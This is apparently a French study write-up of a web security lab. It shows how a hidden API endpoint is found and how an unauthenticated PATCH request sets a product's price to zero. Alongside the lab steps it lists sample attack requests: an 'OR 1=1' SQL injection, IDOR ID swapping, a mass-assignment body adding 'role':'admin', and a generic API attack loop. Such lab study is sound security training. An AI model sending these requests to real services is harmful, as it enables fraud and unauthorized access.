
# 🔹 1. Objectif du lab

> 💥 Trouver un endpoint API inutilisé et exploiter une faille pour acheter un produit

---

# 🔹 2. Situation initiale

- produit trop cher (1337$)
- utilisateur normal (pas admin)
- achat impossible ❌

---

# 🔹 3. Raisonnement clé

👉 Le problème n’est PAS :

- SQL
- login
- session

👉 Le problème est :

> 💥 **logique métier + API cachée**

---

# 🔹 4. Workflow complet

## 🔹 Étape 1 — Observer

Naviguer normalement :

- page produit
- panier
- checkout

👉 observer les requêtes HTTP

---

## 🔹 Étape 2 — Identifier les ressources

Tu vois :

```
/product?productId=1
```

👉 transformation mentale :

```
product → products
?productId=1 → /1
```

---

👉 hypothèses API :

```
/api/products/1
/api/products/1/price
/api/products/1/details
```

---

# 🔹 5. Trouver l’endpoint

👉 endpoint réel :

```
GET /api/products/1/price
```

👉 réponse :

```
{
  "price":"$1337.00"
}
```

---

# 🔹 6. Tester les méthodes

```
OPTIONS /api/products/1/price
```

👉 réponse :

```
Allow: GET, PATCH
```

💥 méthode cachée détectée

---

# 🔹 7. Exploitation

## 🔹 Test PATCH

```
PATCH /api/products/1/price
```

👉 erreurs → indices

---

## 🔹 Construire requête

```
PATCH /api/products/1/price
Content-Type: application/json

{"price":0}
```

---

## 🔹 Résultat

```
{
  "price":"$0.00"
}
```

---

# 🔹 8. Impact

- modification prix
- achat gratuit
- faille critique 💥

---

# 🔹 9. Type de faille

> 💥 Broken Access Control (BOLA API)

---

# 🔹 10. Pourquoi ça marche

Backend fait :

```
price = request.json["price"]
update_price(product_id, price)
```

👉 MAIS :

```
if user.is_admin:
```

❌ absent

---

💥 donc :

- aucune vérification
- confiance totale

---

# 🔹 11. Concept clé

> 💥 Security through obscurity

👉 “personne ne verra l’endpoint”

👉 FAUX

---

# 🔹 12. Pattern API à retenir

```
/api/{ressource}
/api/{ressource}/{id}
/api/{ressource}/{id}/{champ}
```

---

## Exemples

```
/api/products
/api/products/1
/api/products/1/price
/api/users/1
/api/orders/1
```

---

# 🔹 13. Méthodes HTTP

|Méthode|Action|
|---|---|
|GET|lire|
|POST|créer|
|PATCH|modifier|
|DELETE|supprimer|

---

# 🔹 14. Méthode d’attaque API

## Étapes

1. identifier ressource
2. deviner endpoints
3. tester méthodes
4. lire erreurs
5. ajuster requête

---

💥 boucle :

> tester → erreur → corriger → exploiter

---

# 🔹 15. Différences entre vulnérabilités

---

## 🔸 SQL Injection

👉 Tu attaques la base de données

```
GET /product?id=1 OR 1=1
```

👉 backend :

```
SELECT * FROM products WHERE id = 1 OR 1=1;
```

💥 fuite de données

---

## 🔸 IDOR / BOLA

👉 Tu changes l’ID

```
GET /api/users/1 → /api/users/2
```

💥 accès à d’autres comptes

---

## 🔸 Business Logic

👉 Tu casses le workflow

```
POST /api/order/create (sans paiement)
```

💥 commande gratuite

---

## 🔸 Mass Assignment

👉 Tu ajoutes des champs cachés

```
{
  "email":"test@test.com",
  "role":"admin"
}
```

💥 élévation de privilège

---

## 🔸 TON LAB

```
PATCH /api/products/1/price
{"price":0}
```

👉 combinaison :

- Broken Access Control
- Business Logic
- API misconfiguration

---

# 🔹 16. Différence clé à retenir

|   |   |
|---|---|
|Type|Ce que tu attaques|
|SQLi|base de données|
|IDOR|accès ressources|
|Business Logic|règles métier|
|Mass Assignment|champs backend|
|API BAC|autorisation|

---

# 🔹 17. Flow technique réel

```
HTTP → parsing → logique backend → SQL → réponse
```

---

👉 toi tu attaques :

> 💥 la logique backend

---

# 🔹 18. Résumé final

👉 Tu ne vois pas l’API  
👉 Tu la reconstruis

👉 Tu ne casses pas SQL  
👉 Tu casses la logique

👉 Tu ne brute force pas  
👉 Tu réfléchis

---

# 🔥 Conclusion

> 💥 Bug bounty = comprendre à quoi le backend fait confiance  
> et prouver qu’il a tort
